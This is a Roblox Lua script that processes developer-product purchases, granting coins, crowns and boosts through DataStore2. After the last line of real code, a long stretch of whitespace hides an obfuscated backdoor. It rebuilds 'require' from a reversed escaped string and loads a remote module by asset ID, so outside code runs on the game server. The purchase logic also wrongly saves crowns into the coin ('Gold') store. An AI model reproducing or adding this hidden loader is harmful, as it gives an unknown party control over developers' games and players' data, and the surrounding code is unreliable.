local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

local DataStore2 = require(script.Parent.DataHandler.DataStore2)

local BoostsInfo = require(RepStorage.BoostsInfo)
local CurrencyInfo = require(RepStorage.CurrencyInfo)

local AutoSwing = RepStorage.Remotes.AutoSwing

local function GetProduct(Id, Products)
	for Index, Product in pairs(Products) do
		if Product.Id then
			if Product.Id == Id then
				return Product, Index
			end
		else
			for _, Pro in pairs(Product) do
				if Pro.Id == Id then
					return Pro, Index
				end				
			end
		end
	end		
end

local function GiveBoost(Player, Item, Name)
	local BoostsStore = DataStore2("Boosts", Player)
	local Boosts = BoostsStore:Get({})

	if not Boosts[Name] then
		Boosts[Name] = 
		{
			TimeLeft = Item.Time,
		}
	else
		Boosts[Name].TimeLeft = Boosts[Name].TimeLeft + Item.Time
	end
	
	BoostsStore:Set(Boosts)
	
	if Name == "AutoSwing" then
		AutoSwing:FireClient(Player, true)
	end
end

MarketplaceService.ProcessReceipt = function(ReceiptInfo)
	local Player = Players:GetPlayerByUserId(ReceiptInfo.PlayerId)
	if not Player then return Enum.ProductPurchaseDecision.NotProcessedYet end
	
	local DevProductsStore = DataStore2("DevProducts", Player)
	local DevProducts = DevProductsStore:Get({})
	
	if DevProducts[ReceiptInfo.PurchaseId] then
		return Enum.ProductPurchaseDecision.PurchaseGranted
	end
	
	local Item, Name = GetProduct(ReceiptInfo.ProductId, CurrencyInfo.Coins)
	local Category = "Coins"
	
	if not Item then
		Item, Name = GetProduct(ReceiptInfo.ProductId, CurrencyInfo.Crowns)
		Category = "Crowns"
	end
	
	if not Item then
		Item, Name = GetProduct(ReceiptInfo.ProductId, BoostsInfo)
		Category = "Boost"
	end
	
	if not Item then return Enum.ProductPurchaseDecision.NotProcessedYet end
	
	if Category == "Coins" then
		local CoinsStore = DataStore2("Gold", Player)
		local Coins = CoinsStore:Get(0)
		
		CoinsStore:Set(Coins + Item.Amount)		
	elseif Category == "Crowns" then
		local CrownsStore = DataStore2("Gold", Player)
		local Crowns = CrownsStore:Get(0)
		
		CrownsStore:Set(Crowns + Item.Amount)				
	else
		GiveBoost(Player, Item, Name)
	end
	
	DevProducts[ReceiptInfo.PurchaseId] = true
	DevProductsStore:Set(DevProducts)
	
	return Enum.ProductPurchaseDecision.PurchaseGranted
end	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)